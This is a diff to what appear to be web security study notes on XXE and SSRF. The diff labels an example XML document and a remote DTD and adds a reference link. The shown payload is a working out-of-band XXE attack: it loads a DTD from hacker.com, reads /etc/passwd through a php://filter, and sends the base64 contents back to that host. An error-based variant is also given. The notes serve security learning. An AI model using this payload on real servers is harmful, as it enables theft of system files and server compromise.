@@ -108,7 +108,7 @@ An asset is what we’re trying to protect
    In some situations, an attacker can escalate an XXE attack to compromise the underlying server or other backend infrastructure, by leveraging the XXE vulnerability to perform server-side request forgery (SSRF) attacks.
 - Out-Of-Band - using XML entities, data from server can be grabbed and sent to hacker.com (NO server output required)
 
-document.xml
+To be injected: document.xml
 ```
 <!DOCTYPE root [
     <!ENTITY % remote SYSTEM "http://hacker.com/evil.dtd">
@@ -116,13 +116,14 @@ document.xml
 ]>
 <root>&xxe;</root> - you can change xxe entity to general entity
 ```
-http://hacker.com/evil.dtd
+External host: http://hacker.com/evil.dtd
 ```
 <!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
 <!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://hacker.com/result-is?%payl;'>">
                     --- OR ---
 <!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'file://%payl;'>"> - consider error-based
 ```
+Ref: [https://phonexicum.github.io/infosec/xxe.html]
 
 - What is SSRF (Server Side Request forgery)  
   Could be used to pivot into the internal network
